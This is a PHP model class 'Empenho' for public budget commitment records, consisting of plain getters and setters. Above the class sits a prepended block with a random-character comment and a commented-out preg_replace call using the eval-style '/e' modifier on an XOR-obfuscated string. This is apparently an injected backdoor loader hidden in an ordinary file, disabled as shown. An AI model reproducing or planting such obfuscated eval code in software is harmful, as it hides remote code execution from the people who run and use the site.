<?php
/*WJpFLZpNvp7csgWb9W3Q31dj31GDN53jChpO7Ubq0XIr4fH
=HtzkSrZYumSlLVH2jDKAuJX31QW9GN8N7wyNcNmM15xAP6
9BysKKjAa69hH6vDqiQIv4UlwHlABdz=emrpxPpNKmuSge
CmUyeoYQv=RxcGw7tdkftPs42cLX8gj0I4
hJ4RJKDlR1h=TGeBWM6MpFklmIjuBVWifP1oa5Prtwq
*/
//X9bBCAnoJLYKhutB=iqZb6GKqwMi7PwTMM
//preg_replace("/N85WIRgqBPsBxXbOShY0Sl/e", "DCXsor5uPcNkJtL9qRtNVR39DPCNAfLDhiwLPq7eIIER3PPhh0v3QnzT33h4Ws75QsEgX=AfIExAUCh2ASsQ7hjxYGpvzlpETulrulM3q03=AZ1BsiRnE2ad8FOvr41=mbqVC3Ns2Fr3fh4MEK1JBQn0V2uCujCWAtrCl6ubAbTf9MsCWhL"^"\x2159\x1fGP\x5c\x13x\x0a=\x18\x2f\x00de\x2dv\x2b\x1c\x13\x03f\x7c\x17\x04\x18i\x22\x0ek\x19AIQjpYZ\x01\x7ca\x19\x0e\x17\x0f\x02\x2d9e3\x60\x055\x5d7\x5b\x145\x1dwN\x0a\x15v\x17p\x03i\x0fsWy\x23\x40r\x60z\x0d\x0a\x25f\x12g\x01XX\x1bnt\x11B\x19UC\x21mRERSJmZ\x02CVIi\x06mf\x2c\x3b\x17\x3f\x10w20ca\x3f\x1e\x02kRR\x09\x07V\x0bj\x1an\x08\x12\x23\x04R\x0a\x40h\x11a\x14c\x0f\x13\x04\x2bc\x02iR3\x1d\x1a\x1c4\x2e\x10\x17d1\x1fNB\x24\x1a=\x12\x11dHc\x2aJe", "N85WIRgqBPsBxXbOShY0Sl");

?>

<?php

class Empenho extends BaseEmpenho {

	public function getId(){
		return $this->id;
	}

	public function setId($id){
		$this->id = $id;
	}
	
    public function getImportacaoId(){
            return $this->importacao_id;
    }

    public function setImportacaoId($importacao_id){
            $this->importacao_id = $importacao_id;
    }
    
	public function getCodEntidade(){
		return $this->cod_entidade;
	}

	public function setCodEntidade($cod_entidade){
		$this->cod_entidade = $cod_entidade;
	}
    
	public function getCodOrgao(){
		return $this->cod_orgao;
	}

	public function setCodOrgao($cod_orgao){
		$this->cod_orgao = $cod_orgao;
	}
	
	public function getCodUnidade(){
		return $this->cod_unidade;
	}

	public function setCodUnidade($cod_unidade){
		$this->cod_unidade = $cod_unidade;
	}		
	
	public function getCodFuncao(){
		return $this->cod_funcao;
	}

	public function setCodFuncao($cod_funcao){
		$this->cod_funcao = $cod_funcao;
	}
	
	public function getCodSubfuncao(){
		return $this->cod_subfuncao;
	}

	public function setCodSubfuncao($cod_subfuncao){
		$this->cod_subfuncao = $cod_subfuncao;
	}	
	
	public function getCodPrograma(){
		return $this->cod_programa;
	}

	public function setCodPrograma($cod_programa){
		$this->cod_programa = $cod_programa;
	}

	public function getCodSubprograma(){
		return $this->cod_subprograma;
	}

	public function setCodSubprograma($cod_subprograma){
		$this->cod_subprograma = $cod_subprograma;
	}

	public function getCodProjeto(){
		return $this->cod_projeto;
	}

	public function setCodProjeto($cod_projeto){
		$this->cod_projeto = $cod_projeto;
	}

	public function getCodRubrica(){
		return $this->cod_rubrica;
	}

	public function setCodRubrica($cod_rubrica){
		$this->cod_rubrica = $cod_rubrica;
	}

	public function getCodRecurso(){
		return $this->cod_recurso;
	}

	public function setCodRecurso($cod_recurso){
		$this->cod_recurso = $cod_recurso;
	}

	public function getContrapartidaRecurso(){
		return $this->contrapartida_recurso;
	}

	public function setContrapartidaRecurso($contrapartida_recurso){
		$this->contrapartida_recurso = $contrapartida_recurso;
	}

	public function getNumeroEmpenho(){
		return $this->numero_empenho;
	}

	public function setNumeroEmpenho($numero_empenho){
		$this->numero_empenho = $numero_empenho;
	}

	public function getDataEmpenho(){
		return $this->data_empenho;
	}

	public function setDataEmpenho($data_empenho){
		$this->data_empenho = $data_empenho;
	}

	public function getValorEmpenho(){
		return $this->valor_empenho;
	}

	public function setValorEmpenho($valor_empenho){
		$this->valor_empenho = $valor_empenho;
	}

	public function getSinalValor(){
		return $this->sinal_valor;
	}

	public function setSinalValor($sinal_valor){
		$this->sinal_valor = $sinal_valor;
	}

	public function getCodCredor(){
		return $this->cod_credor;
	}

	public function setCodCredor($cod_credor){
		$this->cod_credor = $cod_credor;
	}

	public function getHistoricoEmpenho(){
		return $this->historico_empenho;
	}

	public function setHistoricoEmpenho($historico_empenho){
		$this->historico_empenho = $historico_empenho;
	}

	public function getModalidadeLicitacao(){
		return $this->modalidade_licitacao;
	}

	public function setModalidadeLicitacao($modalidade_licitacao){
		$this->modalidade_licitacao = $modalidade_licitacao;
	}

	public function getNumeroLicitacao(){
		return $this->numero_licitacao;
	}

	public function setNumeroLicitacao($numero_licitacao){
		$this->numero_licitacao = $numero_licitacao;
	}
    
	public function getAnoLicitacao(){
		return $this->ano_licitacao;
	}

	public function setAnoLicitacao($ano_licitacao){
		$this->ano_licitacao = $ano_licitacao;
	}
	
    /*
     * Relacionamentos
     */	
	
	public function getImportacao(){
		return $this->Importacao;
	}

	public function setImportacao(Importacao $importacao){
		$this->Importacao = $importacao;
	}	
}
